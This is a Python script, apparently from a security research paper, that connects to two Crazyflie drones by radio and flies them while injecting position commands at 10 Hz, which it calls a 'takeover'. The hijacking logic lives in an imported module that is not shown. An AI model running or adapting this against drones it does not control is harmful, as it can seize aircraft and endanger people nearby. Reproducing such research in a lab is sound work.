#!/usr/bin/env python3
"""
Concurrent Swarm takeover test - 10 Hz Command Rate
Maintains sustained command injection at 10 Hz as described in the paper.
"""

import time
import cflib.crtp
from cflib.crazyflie import Crazyflie
from concurrent.futures import ThreadPoolExecutor
import threading
import datetime
import math

# Drone URIs - use your actual addresses
DRONE_URIS = [
    "radio://1/80/2M/E7E7E7E7E8",
    "radio://1/80/2M/E7E7E7E7E9",
]

# 10 Hz command rate = 0.1 seconds between commands
COMMAND_INTERVAL = 0.1  # seconds (10 Hz)
ATTACK_DURATION = 30     # seconds to maintain control

def simple_parallel_control():
    """
    Connect to both drones and maintain 10 Hz command rate in parallel.
    This demonstrates sustained takeover as described in the paper.
    """
    
    # Shared variables for controlling both drones
    should_stop = threading.Event()
    
    # Timing variables
    attack_start_time = []
    attack_end_time = []
    time_lock = threading.Lock()
    
    def control_drone(uri, drone_id):
        """Control a single drone with 10 Hz command rate."""
        print(f"\n[DRONE {drone_id}] Starting sustained control for {uri}")
        
        try:
            # Initialize and connect
            cflib.crtp.init_drivers()
            cf = Crazyflie()
            
            print(f"[DRONE {drone_id}] Connecting...")
            cf.open_link(uri)
            
            # Wait a bit for connection to stabilize
            time.sleep(2.0)
            
            # Arm the drone
            cf.platform.send_arming_request(True)
            print(f"[DRONE {drone_id}] Arming command sent")
            time.sleep(5.0)
            
            # Import modified commander (use your actual module name)
            from modified_commander import ModifiedHighLevelCommander
            commander = ModifiedHighLevelCommander(cf)
            
            # Target positions
            target_x = 1.0 if uri == DRONE_URIS[0] else -1.0
            target_y = 0.0
            target_z = 1.0
            target_yaw = 0.0
            
            # Record attack start time
            with time_lock:
                if not attack_start_time:
                    attack_start_time.append(time.time())
            
            # Send takeoff command
            print(f"[DRONE {drone_id}] Taking off...")
            commander.takeoff(1.0, 2.0)
            time.sleep(2.0)
            
            # Maintain 10 Hz command rate for attack duration
            print(f"[DRONE {drone_id}] Starting sustained command injection at 10 Hz...")
            start = time.time()
            cmd_count = 0
            
            while not should_stop.is_set() and (time.time() - start) < ATTACK_DURATION:
                loop_start = time.time()
                
                # Send go_to command
                commander.go_to(target_x, target_y, target_z, target_yaw, COMMAND_INTERVAL)
                cmd_count += 1
                
                # Ensure 10 Hz rate (sleep for remaining time)
                elapsed = time.time() - loop_start
                sleep_time = max(0, COMMAND_INTERVAL - elapsed)
                if sleep_time > 0:
                    time.sleep(sleep_time)
            
            print(f"[DRONE {drone_id}] Sent {cmd_count} commands at ~10 Hz")
            
            # Record attack end time
            with time_lock:
                if not attack_end_time:
                    attack_end_time.append(time.time())
            
            # Land the drone
            print(f"[DRONE {drone_id}] Landing...")
            commander.land(0, 3.0)
            time.sleep(3)
            
            # Turn motors off
            print(f"[DRONE {drone_id}] Turning motors off...")
            cf.platform.send_arming_request(False)
            time.sleep(1)
            
            # Close connection
            cf.close_link()
            print(f"[DRONE {drone_id}] Test completed successfully")
            return True
            
        except Exception as e:
            print(f"[DRONE {drone_id}] Error: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def user_input_handler():
        """Handle user input to stop the attack."""
        print("\n" + "="*60)
        print("CONTROL INSTRUCTIONS:")
        print(f"  Attack will run for {ATTACK_DURATION} seconds automatically")
        print("  Type 's' then ENTER to stop early")
        print("="*60)
        
        while not should_stop.is_set():
            user_input = input("\nCommand (s to stop): ")
            if user_input.lower() == 's':
                print("Stopping attack early...")
                should_stop.set()
                break
    
    print("\n" + "="*60)
    print("PARALLEL CONTROL TEST - 10 Hz COMMAND RATE")
    print("="*60)
    print(f"This will:")
    print(f"  1. Connect to both drones")
    print(f"  2. Takeoff to 1.0m altitude")
    print(f"  3. Maintain {10} Hz ({COMMAND_INTERVAL}s) command rate for {ATTACK_DURATION}s")
    print(f"  4. Land and disarm")
    print("="*60)
    
    input("\nPress ENTER to start (Ctrl+C to cancel)...")
    
    # Start user input handler in a separate thread
    input_thread = threading.Thread(target=user_input_handler)
    input_thread.daemon = True
    input_thread.start()
    
    # Run control in parallel
    results = {}
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=2) as executor:
        # Submit both control tasks
        future1 = executor.submit(control_drone, DRONE_URIS[0], 1)
        future2 = executor.submit(control_drone, DRONE_URIS[1], 2)
        
        # Get results
        results[DRONE_URIS[0]] = future1.result(timeout=ATTACK_DURATION + 30)
        results[DRONE_URIS[1]] = future2.result(timeout=ATTACK_DURATION + 30)
    
    total_duration = time.time() - start_time
    
    # Calculate timing statistics
    if attack_start_time and attack_end_time:
        attack_duration = attack_end_time[0] - attack_start_time[0]
        print(f"\nAttack duration: {attack_duration:.2f} seconds")
        print(f"Target command rate: 10 Hz (every {COMMAND_INTERVAL}s)")
        print(f"Total experiment duration: {total_duration:.2f} seconds")
    
    # Summary
    print("\n" + "="*60)
    print("CONTROL TEST SUMMARY")
    print("="*60)
    
    for uri, success in results.items():
        status = "SUCCESS" if success else "FAILED"
        print(f"  {uri}: {status}")
    
    successful = sum(1 for success in results.values() if success)
    
    if successful == 2:
        print("\nBOTH DRONES CONTROLLED IN PARALLEL AT 10 Hz!")
        print(f"Sustained takeover demonstrated for {ATTACK_DURATION} seconds")
    else:
        print(f"\nOnly {successful}/2 drones could be controlled.")
    
    return results

if __name__ == "__main__":
    simple_parallel_control()
